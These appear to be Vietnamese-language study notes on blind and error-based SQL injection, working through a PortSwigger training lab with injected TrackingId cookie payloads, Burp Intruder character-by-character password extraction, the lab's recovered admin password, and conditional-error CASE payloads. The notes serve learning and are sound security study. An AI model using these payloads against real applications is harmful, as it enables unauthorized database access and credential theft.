I. Blind SQL injection vul<br>
+ app ko phản hồi kết quả của truy vấn SQL or chi tiết lỗi database trong phản hồi của nó
+ UNION attack ko hiệu quả trong trh này<br>

II. Exploiting blind SQL injection by triggering conditional responses<br>
1. Lý thuyết<br>
+ TrackingId cookie khi đc xử lý -> app sẽ báo là có phải ng dùng đã bt hay ko <br>
-> đây là lỗ hổng can khai thác<br>
+ cho phép xác đinh câu trl cho bất kì điều kiện đơn đc tiêm nào và trích xuất từng phần data tại 1 thời điểm (đúng thì phản hồi sai thì ko)<br>

2. Lab: Blind SQL injection with conditional responses<br>
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection
vulnerability to find out the password of the administrator user. To solve the lab, log in as the administrator user.<br>
https://portswigger.net/academy/labs/launch/5aeeac77d52d55cdff3f9a5d86d050c9a77ebfef7657cccb459bee29ad5c3fce?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-conditional-responses<br>

3. Giải<br>
+ B1 xác định TrackingId hoạt động ko: Cookie: TrackingId=cokrQmPGjyNp6yK5; (này có sẵn trong phản hồi rồi) -> trả về Welcome Back
+ B2 check phản hồi khi đk đúng or sai:
<br>Đúng: Cookie: TrackingId=cokrQmPGjyNp6yK5' and 1=1-- -> phản hồi
<br>Sai: Cookie: TrackingId=cokrQmPGjyNp6yK5' and 1=2-- -> ko phản hồi
+ xác định có bảng users ko: Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select 'x' from users limit 1) = 'x'-- -> phản hồi
+ xác định có username 'administrator' ko: Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select 'x' from users where username = 'administrator') = 'x'-- -> phản hồi
+ xác định chiều dài password: Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select 'x' from users where username = 'administrator' and length(password)>1) = 'x'--
+ thử lần lượt đến khi tìm thấy chiều dài phù hợp: 20 (can tìm bằng Intruder)
+ tìm mật khẩu (nhiều kí tự -> xài Burp Intruder):Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select substring(password,1,1) from users where username='administrator')='§a§'-- (trọng tải đánh vào chữ 'a')
+ vào payload add vào danh sách 0-9, a-z, vào cài đặt phần Grep-match sửa thành 'Welcome' và chạy lấy kết quả<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/8c7db2d6-426c-4ed4-876a-86b58ed091bd)<br>

Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select substring(password,2,1) from users where username='administrator')='§a§'-- <br>
-> tiếp tục đến khi tìm đc toàn bộ mật khẩu: pduzuqxql3l3z6bguzec<br>

III. Error-based SQL injection<br>
1. Lý thuyết<br>
- nơi bạn can xài tin nhắn lỗi để trích xuất hoặc suy ra dữ liệu nhạy cảm từ cơ sở dữ liệu dù trong ngữ cảnh mù
- phụ thuộc cấu hình database và loại lỗi bạn can gây ra:<br>
  + khiến app trả về phản hồi lỗi cụ thể dựa trên kết quả biểu thức bool
  + kích hoạt thông báo lỗi xuất data đc truy vấn trả về, biến vul mù thành can thấy được<br>

IV. Exploiting blind SQL injection by triggering conditional errors<br>
1. Lý thuyết<br>
- dùng khi tiêm điều kiện bool khác nhau ko trả về phản hồi khác nhau
- xài cách: sửa truy vấn làm lỗi database chỉ khi đk đúng, thg thì lỗi database sẽ gây ra các phản hồi app khác nhau
- VD:<br>
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a<br>
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a<br>
- xài CASE: check điều kiện và trả về 1 biểu thức khác phụ thuộc vào biểu thức đúng hay ko: BT1: ko có lỗi, BT2: lỗi chia cho 0
- -> dùng để check khi điều kiện tiêm là đúng: xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
- 
